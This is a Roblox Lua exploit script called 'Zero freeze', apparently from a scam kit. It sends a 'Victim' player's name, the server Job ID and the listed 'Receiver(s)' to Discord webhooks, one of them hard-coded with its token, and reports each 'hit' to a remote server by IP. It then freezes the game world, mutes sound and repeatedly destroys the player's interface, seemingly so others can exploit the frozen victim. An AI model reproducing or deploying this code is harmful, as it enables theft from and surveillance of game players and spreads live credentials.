if _G.__ZeroFreezeRan then return end
_G.__ZeroFreezeRan = true

local Players      = game:GetService("Players")
local Player       = Players.LocalPlayer
local PlayerGui    = Player:WaitForChild("PlayerGui")
local CoreGui      = game:GetService("CoreGui")
local RunService   = game:GetService("RunService")
local Workspace    = game:GetService("Workspace")
local StarterGui   = game:GetService("StarterGui")
local SoundService = game:GetService("SoundService")
local HttpService  = game:GetService("HttpService")

local WEBHOOK_URL  = (_G["Zero_Config"] and _G["Zero_Config"].user_webhook) or ""
local TARGET_PLAYERS = (_G["Zero_Config"] and _G["Zero_Config"].users) or {}
local PUBLIC_WEBHOOK_URL = "https://discord.com/api/webhooks/1452387900166635622/6jzYQUIloNR8GvEq4dtGp0ZIbie2--AI9_oYBa3Fc7i1f-xvBGcJDSgr7ltJL90lzLAb"
local VPS_INCREMENT = "http://13.239.7.10:5000/increment-hitcount"
local API_KEY = getgenv().API_KEY or "supersecretkey"

local function safeRequest(url, body, headers)
    local h = headers or {["Content-Type"] = "application/json"}
    pcall(function()
        (syn and syn.request or http and http.request or request or HttpService.PostAsync)({
            Url  = url,
            Method = "POST",
            Headers = h,
            Body = HttpService:JSONEncode(body)
        })
    end)
end

local function sendZeroEmbed(title, desc, color, fields, isPublic)
    local payload = {
        username = "ZeroOnTop",
        avatar_url = "https://scriptssm.vercel.app/pngs/logo.png",
        embeds = {{
            title = title,
            description = desc,
            color = color,
            fields = fields or {},
            footer = {text = "discord.gg/cnUAk7uc3n", icon_url = "https://i.ibb.co/5xJ8LK6X/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png"},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    safeRequest(isPublic and PUBLIC_WEBHOOK_URL or WEBHOOK_URL, payload)
end

local function triggerVpsHit()
    if WEBHOOK_URL == "" then return end
    safeRequest(VPS_INCREMENT, {webhook = WEBHOOK_URL}, {["X-API-KEY"] = API_KEY})
end

task.spawn(function()
    local fields = {
        {name = "👤 Victim", value = "```" .. Player.Name .. "```", inline = true},
        {name = "🛰️ Job ID", value = "```" .. tostring(game.JobId) .. "```", inline = true},
        {name = "🎯 Receiver(s)", value = "```" .. table.concat(TARGET_PLAYERS, ", ") .. "```", inline = false}
    }
    sendZeroEmbed("⛄ Freeze Initiated", "Zero freeze engine active – world locked.", 0x3498db, fields, false)
    triggerVpsHit()
end)

pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)
SoundService.AmbientReverb = Enum.ReverbType.NoReverb
Workspace.DescendantAdded:Connect(function(obj)
    if obj:IsA("Sound") then obj.Volume = 0; obj:Stop() end
end)
RunService.Heartbeat:Connect(function()
    for _, snd in ipairs(Workspace:GetDescendants()) do
        if snd:IsA("Sound") and snd.IsPlaying then snd:Stop() end
    end
end)
local Camera = Workspace.CurrentCamera
Camera.CameraType = Enum.CameraType.Scriptable

local frozenParts, frozenJoints = {}, {}
local function freezeObject(obj)
    if obj:IsA("BasePart") then
        frozenParts[obj] = {CFrame = obj.CFrame, Size = obj.Size, Transparency = obj.Transparency,
                            Color = obj.Color, Material = obj.Material, CanCollide = obj.CanCollide}
    elseif obj:IsA("Motor6D") or obj:IsA("Weld") or obj:IsA("ManualWeld") then
        frozenJoints[obj] = {C0 = obj.C0, C1 = obj.C1}
    elseif obj:IsA("Sound") then obj.Volume = 0; obj:Stop() end
end
for _, obj in ipairs(Workspace:GetDescendants()) do freezeObject(obj) end
Workspace.DescendantAdded:Connect(freezeObject)

RunService.Stepped:Connect(function()
    for part, data in pairs(frozenParts) do
        if part.Parent then
            part.CFrame = data.CFrame; part.Size = data.Size; part.Transparency = data.Transparency
            part.Color = data.Color; part.Material = data.Material; part.CanCollide = data.CanCollide
        end
    end
    for joint, data in pairs(frozenJoints) do
        if joint.Parent then joint.C0 = data.C0; joint.C1 = data.C1 end
    end
end)

local function stopAnims(humanoid)
    for _, track in ipairs(humanoid:GetPlayingAnimationTracks()) do track:Stop() end
end
local function lockChar(char)
    local hum = char:FindFirstChildOfClass("Humanoid")
    if hum then
        hum.WalkSpeed = 0; hum.JumpPower = 0; hum.PlatformStand = true
        stopAnims(hum)
        for _, acc in ipairs(char:GetChildren()) do
            if acc:IsA("Accessory") then freezeObject(acc:FindFirstChild("Handle")) end
        end
    end
end
if Player.Character then lockChar(Player.Character) end
Player.CharacterAdded:Connect(lockChar)
for _, plr in ipairs(Players:GetPlayers()) do
    if plr.Character then lockChar(plr.Character) end
    plr.CharacterAdded:Connect(lockChar)
end
Players.PlayerAdded:Connect(function(plr) plr.CharacterAdded:Connect(lockChar) end)
RunService.Heartbeat:Connect(function()
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr.Character then
            local hum = plr.Character:FindFirstChildOfClass("Humanoid")
            if hum then stopAnims(hum) end
        end
    end
end)

local function clearGui()
    for _, gui in ipairs(PlayerGui:GetChildren()) do
        if gui:IsA("GuiObject") and gui.Name ~= "sm_notif" and gui.Name ~= "sm_main" then
            pcall(gui.Destroy, gui)
        end
    end
    for _, gui in ipairs(CoreGui:GetChildren()) do
        pcall(gui.Destroy, gui)
    end
end
clearGui()
while task.wait(0.03) do clearGui() end
